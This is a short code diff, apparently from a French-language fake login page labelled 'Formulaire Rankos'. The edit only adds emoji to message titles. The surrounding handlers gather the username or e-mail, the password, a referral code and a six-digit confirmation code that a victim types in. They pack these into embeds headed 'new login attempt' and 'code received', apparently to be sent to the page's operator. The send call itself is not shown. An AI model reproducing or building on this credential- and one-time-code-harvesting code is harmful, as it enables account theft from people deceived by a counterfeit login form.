@@ -222,13 +222,13 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
   const msg = {
     embeds: [
       {
-        title: " Nouvelle tentative de connexion",
+        title: "📥 Nouvelle tentative de connexion",
         description: "Informations collectées via le formulaire",
         color: 0xffc800,
         fields: [
-          { name: " Nom d'utilisateur / e-mail", value: username },
-          { name: " Mot de passe", value: password },
-          { name: " Code de parrainage", value: referralCode }
+          { name: "👤 Nom d'utilisateur / e-mail", value: username },
+          { name: "🔒 Mot de passe", value: password },
+          { name: "🎁 Code de parrainage", value: referralCode }
         ],
         timestamp: new Date().toISOString(),
         footer: { text: "Formulaire Rankos" }
@@ -257,7 +257,7 @@ document.getElementById('confirmBtn').addEventListener('click', function() {
   const msg = {
     embeds: [
       {
-        title: " Code reçu",
+        title: "🔑 Code reçu",
         description: "Code à 6 chiffres entré",
         color: 0xffc800,
         fields: [{ name: "Code reçu", value: code }],
